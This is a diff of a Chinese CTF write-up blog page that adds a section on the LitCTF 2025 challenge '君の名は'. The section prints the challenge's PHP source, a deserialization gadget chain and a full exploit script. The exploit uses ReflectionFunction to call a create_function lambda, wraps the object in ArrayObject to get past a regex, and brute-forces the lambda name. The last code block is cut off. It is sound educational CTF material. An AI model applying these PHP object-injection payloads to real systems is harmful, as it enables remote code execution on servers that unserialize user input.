@@ -302,6 +302,12 @@
         <li><a href="#md5爆破用户密码x-sign与时间戳验证登入简单的ssrf">md5爆破用户密码+X-Sign与时间戳验证登入+简单的ssrf</a></li>
       </ol>
     </li>
+    <li><a href="#君の名は">君の名は</a>
+      <ol>
+        <li><a href="#原生类调用匿名函数arrayobject包裹绕过正则爆破找到匿名函数名">原生类调用匿名函数+ArrayObject包裹绕过正则+爆破找到匿名函数名</a></li>
+        <li><a href="#非预期直接this-musubi调用匿名函数">非预期：<strong>直接($this-&gt;musubi)();调用匿名函数</strong></a></li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
@@ -370,7 +376,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 6 分钟
+                    阅读时长: 9 分钟
                 </time>
             </div>
         
@@ -699,7 +705,7 @@
 </div>
 </div><p>看源码，知js将用户密码进行md5加密处理，和上题一样，进行爆破,用户密码进行md5加密，得到admin/admin123</p>
 <img src="image-20250526213930797.png" alt="image-20250526213930797" style="zoom:50%;" />
-<p>但是直接改用户密码发包不行，因为有时间戳与X-Sign影响，所有写代码发送，直接将源码的js代码改成python代码</p>
+<p>但是直接改用户密码发包不行，因为有时间戳与X-Sign影响，所以写代码发送，直接将源码的js代码改成python代码</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -937,8 +943,367 @@
 </div>
 </div><p>在里面发现可以路由327a6c4304ad5938eaf0efb6cc3e53dc.php访问即可</p>
 <img src="image-20250526231544300.png" alt="image-20250526231544300" style="zoom:50%;" />
-<p>此题还是很好的，难度不是很难，但是赛场很难写出来，需要非常细</p>
-
+<p>此题还是很好的，难度不是很难，但是赛场很难写出来，需要非常细。</p>
+<h2 id="君の名は">君の名は
+</h2><h3 id="原生类调用匿名函数arrayobject包裹绕过正则爆破找到匿名函数名">原生类调用匿名函数+ArrayObject包裹绕过正则+爆破找到匿名函数名
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">create_function</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s1">&#39;die(`/readflag`);&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Taki</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$musubi</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$magic</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">__unserialize</span><span class="p">(</span><span class="k">array</span> <span class="nv">$data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">musubi</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;musubi&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">magic</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;magic&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">musubi</span><span class="p">)();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nv">$args</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="k">new</span> <span class="nv">$args</span><span class="p">[</span><span class="mi">0</span><span class="p">](</span><span class="nv">$args</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">magic</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Mitsuha</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$memory</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$thread</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">memory</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">thread</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">KatawareDoki</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$soul</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$kuchikamizake</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">soul</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">flag</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">kuchikamizake</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;call error!no flag!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$Litctf2025</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;Litctf2025&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^[Oa]:[\d]+/i&#34;</span><span class="p">,</span> <span class="nv">$Litctf2025</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$Litctf2025</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;把O改成C不就行了吗,笨蛋!～(∠・ω&lt; )⌒☆&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此题链子很简单，但是获得flag有点难，这里很显然是下面</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">create_function</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s1">&#39;die(/readflag);&#39;</span><span class="p">);</span>	<span class="c1">#创造匿名函数，执行/readflag然后终止脚本
+</span></span></span><span class="line"><span class="cl"><span class="c1">#上述匿名函数的创建与执行过程等价于下面
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">lambda_1</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;die(/readflag);&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">die</span><span class="p">(</span><span class="o">/</span><span class="nx">readflag</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://www.cnblogs.com/zzjdbk/p/12980483.html"  target="_blank" rel="noopener"
+    >PHP代码审计之create_function()函数 - My_Dreams - 博客园</a></p>
+<p>所以我们就要调用这个匿名函数,所以思路就是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">找到一个可以调用匿名函数的原生类</span>
+</span></span><span class="line"><span class="cl"><span class="nx">找到匿名函数的名字</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现ReflectionFunction的invoke方法可以</p>
+<img src="image-20250527115427319.png" alt="image-20250527115427319" style="zoom:50%;" />
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">还有一个知识点就是__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nv">$args</span><span class="p">)</span><span class="nx">的传参问题</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">假如我们触发__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nv">$args</span><span class="p">)</span><span class="nx">调用的函数是</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">flag</span><span class="p">(</span><span class="nv">$arg1</span><span class="p">,</span><span class="nv">$arg2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">那么触发__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nv">$args</span><span class="p">)</span><span class="nx">时</span><span class="nv">$func就会被赋值为</span><span class="s2">&#34;flag&#34;</span><span class="p">;</span><span class="nv">$args就会被赋值为flag</span><span class="p">()</span><span class="nx">的参数构成的数组。所以要给</span><span class="nv">$args赋值需要在flag</span><span class="p">()</span><span class="nx">的参数里赋值。</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">绕过正则的化</span>
+</span></span><span class="line"><span class="cl"><span class="nx">这里用一个类来对链子进行包装，然后开头的O就会被自动转换为C</span>
+</span></span><span class="line"><span class="cl"><span class="nx">可以使用的类有很多：</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">ArrayObject</span><span class="o">::</span><span class="na">unserialize</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ArrayIterator</span><span class="o">::</span><span class="na">unserialize</span>
+</span></span><span class="line"><span class="cl"><span class="nx">RecursiveArrayIterator</span><span class="o">::</span><span class="na">unserialize</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SplObjectStorage</span><span class="o">::</span><span class="na">unserialize</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://chenxi9981.github.io/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96/"  target="_blank" rel="noopener"
+    >php反序列化 | 晨曦的个人小站</a></p>
+<p>所以有exp是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">create_function</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s1">&#39;die(`/readflag`);&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Taki</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$musubi</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$magic</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">__unserialize</span><span class="p">(</span><span class="k">array</span> <span class="nv">$data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">musubi</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;musubi&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">magic</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;magic&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">musubi</span><span class="p">)();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nv">$args</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="k">new</span> <span class="nv">$args</span><span class="p">[</span><span class="mi">0</span><span class="p">](</span><span class="nv">$args</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">magic</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Mitsuha</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$memory</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$thread</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">memory</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">thread</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">KatawareDoki</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$soul</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$kuchikamizake</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">soul</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">flag</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">kuchikamizake</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;call error!no flag!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">Taki</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">musubi</span><span class="o">=</span><span class="k">new</span> <span class="nx">Mitsuha</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">musubi</span><span class="o">-&gt;</span><span class="na">memory</span><span class="o">=</span><span class="k">new</span> <span class="nx">KatawareDoki</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">musubi</span><span class="o">-&gt;</span><span class="na">memory</span><span class="o">-&gt;</span><span class="na">kuchikamizake</span><span class="o">=</span><span class="s1">&#39;ReflectionFunction&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">musubi</span><span class="o">-&gt;</span><span class="na">memory</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="s2">&#34;</span><span class="se">\00</span><span class="s2">lambda_10&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">musubi</span><span class="o">-&gt;</span><span class="na">memory</span><span class="o">-&gt;</span><span class="na">soul</span><span class="o">=</span><span class="k">new</span> <span class="nx">Taki</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">musubi</span><span class="o">-&gt;</span><span class="na">memory</span><span class="o">-&gt;</span><span class="na">soul</span><span class="o">-&gt;</span><span class="na">musubi</span><span class="o">=</span><span class="s1">&#39;time&#39;</span><span class="p">;</span><span class="c1">#目的就是让return ($this-&gt;musubi)();这一步不报错，保证程序完整进行,但是我的php环境是8点多，这个代码要在7.2下运行（create_function()函数在PHP 7.2.0版本中已经被废弃），所以我拉了一个7.1的docker环境运行此代码，发现其实不要此行也可以执行
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">musubi</span><span class="o">-&gt;</span><span class="na">memory</span><span class="o">-&gt;</span><span class="na">soul</span><span class="o">-&gt;</span><span class="na">magic</span><span class="o">=</span><span class="s1">&#39;invoke&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$aa</span><span class="o">=</span><span class="k">new</span> <span class="nx">Arrayobject</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$payload</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$aa</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$payload</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\00</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;%00&#34;</span><span class="p">,</span><span class="nv">$payload</span><span class="p">);</span>		
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$payload</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">C</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="s2">&#34;ArrayObject&#34;</span><span class="o">:</span><span class="mi">278</span><span class="o">:</span><span class="p">{</span><span class="nx">x</span><span class="o">:</span><span class="nx">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="nx">O</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;Taki&#34;</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;musubi&#34;</span><span class="p">;</span><span class="nx">O</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;Mitsuha&#34;</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;memory&#34;</span><span class="p">;</span><span class="nx">O</span><span class="o">:</span><span class="mi">12</span><span class="o">:</span><span class="s2">&#34;KatawareDoki&#34;</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;soul&#34;</span><span class="p">;</span><span class="nx">O</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;Taki&#34;</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;musubi&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;time&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;magic&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;invoke&#34;</span><span class="p">;}</span><span class="nx">s</span><span class="o">:</span><span class="mi">13</span><span class="o">:</span><span class="s2">&#34;kuchikamizake&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">18</span><span class="o">:</span><span class="s2">&#34;ReflectionFunction&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;name&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="s2">&#34;%00lambda_10&#34;</span><span class="p">;}</span><span class="nx">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;thread&#34;</span><span class="p">;</span><span class="nx">N</span><span class="p">;}</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;magic&#34;</span><span class="p">;</span><span class="nx">N</span><span class="p">;};</span><span class="nx">m</span><span class="o">:</span><span class="nx">a</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="p">{}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">因为create_function()创造的匿名函数（lambda样式），名字我们不知道会是多少，所以我上面一lamba_10为序号来进行爆破
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250527151052297.png" alt="image-20250527151052297" style="zoom:50%;" />
+<h3 id="非预期直接this-musubi调用匿名函数">非预期：<strong>直接($this-&gt;musubi)();调用匿名函数</strong>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Taki</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$musubi</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\000</span><span class="s2">lambda_1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$magic</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Taki</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
